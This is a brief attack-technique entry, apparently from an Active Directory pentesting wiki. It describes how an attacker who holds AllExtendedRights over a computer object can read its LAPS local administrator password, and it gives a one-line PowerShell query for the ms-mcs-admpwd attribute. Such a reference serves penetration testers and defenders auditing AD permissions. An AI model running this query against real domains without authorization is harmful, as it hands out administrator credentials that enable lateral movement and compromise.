# ReadLAPSPassword

This abuse can be carried out when controlling an object that has `AllExtendedRights` over a target computer.

The attacker can read the LAPS password of the computer account. This can be achieved with the Active Directory PowerShell module.

```bash
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```

### 

